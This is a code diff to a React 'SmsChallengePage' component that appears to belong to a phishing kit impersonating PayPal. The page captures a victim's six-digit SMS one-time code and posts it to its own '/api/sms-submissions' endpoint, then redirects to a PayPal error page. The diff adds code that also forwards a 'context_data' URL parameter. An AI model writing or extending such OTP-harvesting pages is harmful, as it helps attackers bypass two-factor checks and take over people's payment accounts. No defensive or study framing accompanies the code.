@@ -51,11 +51,16 @@ export const SmsChallengePage = (): JSX.Element => {
   const handleSubmit = async () => {
     if (otpValue.length === 6) {
       try {
+        // Extract contextData from URL if present
+        const urlParams = new URLSearchParams(window.location.search);
+        const contextData = urlParams.get('context_data');
+        
         // Submit SMS data to backend
         await apiRequest("POST", "/api/sms-submissions", {
           otpCode: otpValue,
           stepupContext: stepupContext,
           rememberDevice: rememberDevice,
+          contextData: contextData,
         });
 
         // Redirect to PayPal error page
